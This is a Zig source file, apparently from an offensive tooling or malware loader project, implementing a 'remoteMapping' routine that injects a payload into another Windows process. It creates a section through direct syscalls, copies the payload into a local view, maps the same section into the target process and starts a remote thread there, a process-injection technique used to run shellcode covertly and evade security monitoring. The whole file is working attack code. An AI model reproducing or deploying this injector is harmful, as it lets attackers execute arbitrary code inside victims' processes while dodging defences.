const std = @import("std");
const windows = std.os.windows;
const config = @import("config");
const Syscalls = @import("../syscall.zig").Syscalls;
const mem = @import("../helper/mem.zig");
const win32 = @import("../win32.zig");
const getRemoteProcessHandle = @import("../process.zig").getRemoteProcessHandle;

pub fn remoteMapping(syscalls: Syscalls, payload: []const u8) !void {
    // Get remote process
    const h_process = try getRemoteProcessHandle(syscalls);
    if (h_process == null) return error.TargetProcessNotFound;
    defer _ = mem.ntClose(syscalls, h_process.?);

    // Create section
    var max_size: windows.LARGE_INTEGER = @intCast(payload.len);
    const h_section = try mem.ntCreateSection(syscalls, &max_size);
    defer _ = mem.ntClose(syscalls, h_section);

    // Map local section
    var local_view_size: windows.SIZE_T = @intCast(payload.len);
    const local_map_addr = try mem.ntMapSection(syscalls, h_section, null, &local_view_size);
    // defer _ = mem.ntUnmapSection(syscalls, null, local_map_addr);

    // Copy payload to mapped memory
    @memcpy(@as([*]u8, @ptrCast(local_map_addr)), payload[0..payload.len]);

    // Map remote section
    var remote_view_size: windows.SIZE_T = @intCast(payload.len);
    const remote_map_addr = try mem.ntMapSection(syscalls, h_section, h_process, &remote_view_size);
    // defer _ = mem.ntUnmapSection(syscalls, h_process, remote_map_addr);

    // Create remote thread
    const h_thread = try mem.ntCreateRemoteThread(syscalls, h_process, remote_map_addr);
    defer _ = mem.ntClose(syscalls, h_thread);

    mem.ntWait(syscalls, h_thread);
}